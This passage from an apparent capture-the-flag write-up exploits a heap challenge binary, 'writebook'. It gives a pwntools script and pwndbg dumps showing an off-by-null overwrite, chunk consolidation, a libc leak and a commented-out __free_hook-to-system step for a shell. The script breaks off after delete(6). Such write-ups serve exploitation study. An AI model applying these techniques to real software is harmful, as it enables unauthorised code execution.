          printf("size: ");
          __isoc99_scanf("%d", &size);
          if ( (unsigned int)size 1
    chunk0 -> unsorted bin (delete 0)
    向前合并至chunk0 (delete 9)
    重新申请回tcache chunk0
    show(7) -> leak libc
###  exp
    # coding = utf-8
    from pwn import *
    context.log_level="debug"
    context.terminal = ["/usr/bin/tmux","sp","-h"]
    p=process("./writebook")
    #elf=ELF("./writebook")
    libc=ELF("/home/yrl/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc.so.6")
    def add1(size):
            p.recvuntil("> ")
            p.sendline("1")
            p.recvuntil("2. Write on both sides?\n> ")
            p.sendline("1")
            p.recvuntil("size: ")
            p.sendline(str(size))
    def add2(size):
            p.recvuntil("> ")
            p.sendline("1")
            p.recvuntil("2. Write on both sides?\n> ")
            p.sendline("2")
            p.recvuntil("size: ")
            p.sendline(str(size))
    def delete(index):
            p.recvuntil("> ")
            p.sendline("4")
            p.recvuntil("Page: ")
            p.sendline(str(index))
    def edit(index,content):
            p.recvuntil("> ")
            p.sendline("2")        
            p.recvuntil("Page: ")
            p.sendline(str(index))
            p.recvuntil("Content: ")
            p.sendline(content)
    def show(index):
            p.recvuntil("> ")
            p.sendline("3")        
            p.recvuntil("Page: ")
            p.sendline(str(index))
    for i in range(8):
        add1(0xf0)
    add2(0x178)
    add2(0x178)
    for i in range(7):
        delete(i+1)
    edit(8,b'a'*0x170+p64(0x980)) #off by null
    '''
    Addr: 0x55cd9156ca50
    Size: 0x181
    Allocated chunk
    Addr: 0x55cd9156cbd0
    Size: 0x100
    Allocated chunk
    Addr: 0x55cd9156ccd0
    Size: 0x00
    pwndbg> x/10gx 0x55cd9156ca50-0x10
    0x55cd9156ca40:        0x0000000000000000        0x0000000000000000
    0x55cd9156ca50:        0x0000000000000000        0x0000000000000181  #8
    0x55cd9156ca60:        0x6161616161616161        0x6161616161616161
    0x55cd9156ca70:        0x6161616161616161        0x6161616161616161
    0x55cd9156ca80:        0x6161616161616161        0x6161616161616161
    pwndbg> 
    0x55cd9156ca90:        0x6161616161616161        0x6161616161616161
    0x55cd9156caa0:        0x6161616161616161        0x6161616161616161
    0x55cd9156cab0:        0x6161616161616161        0x6161616161616161
    0x55cd9156cac0:        0x6161616161616161        0x6161616161616161
    0x55cd9156cad0:        0x6161616161616161        0x6161616161616161
    pwndbg> 
    0x55cd9156cae0:        0x6161616161616161        0x6161616161616161
    0x55cd9156caf0:        0x6161616161616161        0x6161616161616161
    0x55cd9156cb00:        0x6161616161616161        0x6161616161616161
    0x55cd9156cb10:        0x6161616161616161        0x6161616161616161
    0x55cd9156cb20:        0x6161616161616161        0x6161616161616161
    pwndbg> 
    0x55cd9156cb30:        0x6161616161616161        0x6161616161616161
    0x55cd9156cb40:        0x6161616161616161        0x6161616161616161
    0x55cd9156cb50:        0x6161616161616161        0x6161616161616161
    0x55cd9156cb60:        0x6161616161616161        0x6161616161616161
    0x55cd9156cb70:        0x6161616161616161        0x6161616161616161
    pwndbg> 
    0x55cd9156cb80:        0x6161616161616161        0x6161616161616161
    0x55cd9156cb90:        0x6161616161616161        0x6161616161616161
    0x55cd9156cba0:        0x6161616161616161        0x6161616161616161
    0x55cd9156cbb0:        0x6161616161616161        0x6161616161616161
    0x55cd9156cbc0:        0x6161616161616161        0x6161616161616161
    pwndbg> 
    0x55cd9156cbd0:        0x0000000000000980        0x0000000000000100  #181->100
    '''
    edit(9,b'a'*0xf0+p64(0)+p64(0x81))
    '''
    Addr: 0x557aed61ca50
    Size: 0x181
    Allocated chunk
    Addr: 0x557aed61cbd0
    Size: 0x100
    Allocated chunk | PREV_INUSE
    Addr: 0x557aed61ccd0
    Size: 0x81
    Top chunk | PREV_INUSE
    Addr: 0x557aed61cd50
    Size: 0x202b1
    pwndbg> x/10gx 0x557aed61ca40
    0x557aed61ca40:        0x0000000000000000        0x0000000000000000
    0x557aed61ca50:        0x0000000000000000        0x0000000000000181
    0x557aed61ca60:        0x6161616161616161        0x6161616161616161
    0x557aed61ca70:        0x6161616161616161        0x6161616161616161
    0x557aed61ca80:        0x6161616161616161        0x6161616161616161
    pwndbg> 
    0x557aed61ca90:        0x6161616161616161        0x6161616161616161
    0x557aed61caa0:        0x6161616161616161        0x6161616161616161
    0x557aed61cab0:        0x6161616161616161        0x6161616161616161
    0x557aed61cac0:        0x6161616161616161        0x6161616161616161
    0x557aed61cad0:        0x6161616161616161        0x6161616161616161
    pwndbg> 
    0x557aed61cae0:        0x6161616161616161        0x6161616161616161
    0x557aed61caf0:        0x6161616161616161        0x6161616161616161
    0x557aed61cb00:        0x6161616161616161        0x6161616161616161
    0x557aed61cb10:        0x6161616161616161        0x6161616161616161
    0x557aed61cb20:        0x6161616161616161        0x6161616161616161
    pwndbg> 
    0x557aed61cb30:        0x6161616161616161        0x6161616161616161
    0x557aed61cb40:        0x6161616161616161        0x6161616161616161
    0x557aed61cb50:        0x6161616161616161        0x6161616161616161
    0x557aed61cb60:        0x6161616161616161        0x6161616161616161
    0x557aed61cb70:        0x6161616161616161        0x6161616161616161
    pwndbg> 
    0x557aed61cb80:        0x6161616161616161        0x6161616161616161
    0x557aed61cb90:        0x6161616161616161        0x6161616161616161
    0x557aed61cba0:        0x6161616161616161        0x6161616161616161
    0x557aed61cbb0:        0x6161616161616161        0x6161616161616161
    0x557aed61cbc0:        0x6161616161616161        0x6161616161616161
    pwndbg> 
    0x557aed61cbd0:        0x0000000000000980        0x0000000000000100
    0x557aed61cbe0:        0x6161616161616161        0x6161616161616161
    0x557aed61cbf0:        0x6161616161616161        0x6161616161616161
    0x557aed61cc00:        0x6161616161616161        0x6161616161616161
    0x557aed61cc10:        0x6161616161616161        0x6161616161616161
    pwndbg> 
    0x557aed61cc20:        0x6161616161616161        0x6161616161616161
    0x557aed61cc30:        0x6161616161616161        0x6161616161616161
    0x557aed61cc40:        0x6161616161616161        0x6161616161616161
    0x557aed61cc50:        0x6161616161616161        0x6161616161616161
    0x557aed61cc60:        0x6161616161616161        0x6161616161616161
    pwndbg> 
    0x557aed61cc70:        0x6161616161616161        0x6161616161616161
    0x557aed61cc80:        0x6161616161616161        0x6161616161616161
    0x557aed61cc90:        0x6161616161616161        0x6161616161616161
    0x557aed61cca0:        0x6161616161616161        0x6161616161616161
    0x557aed61ccb0:        0x6161616161616161        0x6161616161616161
    pwndbg> 
    0x557aed61ccc0:        0x6161616161616161        0x6161616161616161
    0x557aed61ccd0:        0x0000000000000000        0x0000000000000081
    0x557aed61cce0:        0x0000000000000000        0x0000000000000000
    0x557aed61ccf0:        0x0000000000000000        0x0000000000000000
    0x557aed61cd00:        0x0000000000000000        0x0000000000000000
    pwndbg> 
    0x557aed61cd10:        0x0000000000000000        0x0000000000000000
    0x557aed61cd20:        0x0000000000000000        0x0000000000000000
    0x557aed61cd30:        0x0000000000000000        0x0000000000000000
    0x557aed61cd40:        0x0000000000000000        0x0000000000000000
    0x557aed61cd50:        0x0000000000000000        0x00000000000202b1
    '''
    #gdb.attach(p)
    delete(0) #unsorted bin
    delete(9) #qian xiang he bing
    '''
    pwndbg> x/10gx 0x5566fdfa8000+0x202060
    0x5566fe1aa060:        0x0000000000000000        0x00000000000000f0
    0x5566fe1aa070:        0x0000000000000000        0x00000000000000f0
    0x5566fe1aa080:        0x0000000000000000        0x00000000000000f0
    0x5566fe1aa090:        0x0000000000000000        0x00000000000000f0
    0x5566fe1aa0a0:        0x0000000000000000        0x00000000000000f0
    pwndbg> 
    0x5566fe1aa0b0:        0x0000000000000000        0x00000000000000f0
    0x5566fe1aa0c0:        0x0000000000000000        0x00000000000000f0
    0x5566fe1aa0d0:        0x0000000000000000        0x00000000000000f0
    0x5566fe1aa0e0:        0x00005566feb74a60        0x0000000000000178
    0x5566fe1aa0f0:        0x0000000000000000        0x0000000000000178
    '''
    for i in range(7):
        add1(0xf0)
    #gdb.attach(p)
    add1(0xf0) #7 new unsorted bin  
    show(7)
    p.recvuntil("Content: ")
    libc_base = u64(p.recv(6).ljust(8,"\x00")) - (0x00007faf52301230-0x7faf51f15000)
    free_hook=libc_base+libc.sym['__free_hook']
    print "libc_base : "+hex(libc_base)
    print "free_hook : "+hex(free_hook)
    '''
    pwndbg> x/10gx 0x202060+ 0x55c820fd6000
    0x55c8211d8060:        0x000055c821adc960        0x00000000000000f0 #0
    0x55c8211d8070:        0x000055c821adc860        0x00000000000000f0
    0x55c8211d8080:        0x000055c821adc760        0x00000000000000f0
    0x55c8211d8090:        0x000055c821adc660        0x00000000000000f0
    0x55c8211d80a0:        0x000055c821adc560        0x00000000000000f0
    pwndbg> 
    0x55c8211d80b0:        0x000055c821adc460        0x00000000000000f0
    0x55c8211d80c0:        0x000055c821adc360        0x00000000000000f0 #6
    0x55c8211d80d0:        0x000055c821adc260        0x00000000000000f0 #7
    0x55c8211d80e0:        0x000055c821adca60        0x0000000000000178 #8
    0x55c8211d80f0:        0x0000000000000000        0x0000000000000178
    '''
    add1(0xf0)
    '''
    pwndbg> x/10gx 0x202060+ 0x5573ee629000
    0x5573ee82b060:        0x00005573eefd7960        0x00000000000000f0 #0
    0x5573ee82b070:        0x00005573eefd7860        0x00000000000000f0
    0x5573ee82b080:        0x00005573eefd7760        0x00000000000000f0
    0x5573ee82b090:        0x00005573eefd7660        0x00000000000000f0
    0x5573ee82b0a0:        0x00005573eefd7560        0x00000000000000f0
    0x5573ee82b0b0:        0x00005573eefd7460        0x00000000000000f0 #5
    0x5573ee82b0c0:        0x00005573eefd7360        0x00000000000000f0 #6
    0x5573ee82b0d0:        0x00005573eefd7260        0x00000000000000f0 #7
    0x5573ee82b0e0:        0x00005573eefd7a60        0x0000000000000178 #8
    0x5573ee82b0f0:        0x00005573eefd7360        0x00000000000000f0 #9
    '''
    # delete(6) # 6==9
    # #gdb.attach(p)
    # edit(9,p64(free_hook-0x10))
    # add1(0xf0) # 6
    # add1(0xf0) # 10
    # #add1(0xf0)
    # #gdb.attach(p)
    # edit(10,"/bin/sh\x00"*2+p64(libc_base+libc.sym['system']))
    # edit(6,"/bin/sh\x00"*2)
    # delete(6)
    delete(6) # 6==9
    #gdb.attach(p)